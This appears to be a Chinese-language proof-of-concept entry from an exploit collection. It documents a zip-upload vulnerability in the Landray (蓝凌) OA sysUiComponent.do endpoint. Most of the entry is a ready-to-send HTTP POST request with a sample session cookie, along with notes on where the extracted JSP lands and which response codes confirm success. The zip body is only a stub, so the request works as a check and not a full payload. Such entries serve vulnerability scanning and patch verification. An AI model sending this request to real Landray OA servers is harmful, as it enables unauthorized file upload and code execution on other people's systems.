﻿# 蓝凌OA sysUiComponent.do Zip上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：需要构造zip文件，上传解压后路径 /resource/ui-component/2023/??.jsp

> 漏洞特征：

> 验证脚本：HTTP

```
POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------15610248407689
Cookie: SESSION=YmI0OGMyZDQtZDE0NC00MTQ2LWJmMzMtNWE5NDMwOTYxM2Ex
DNT: 1
Connection: close

-----------------------------15610248407689
Content-Disposition: form-data; name="file"; filename="test.zip"
Content-Type: application/x-zip-compressed

PK
-----------------------------15610248407689--
```

> 响应代码特征：200

> 响应内容特征：status

> 上传文件定位：

> 验证文件来源：蓝凌OA sysUiComponent.do Zip上传漏洞.poc
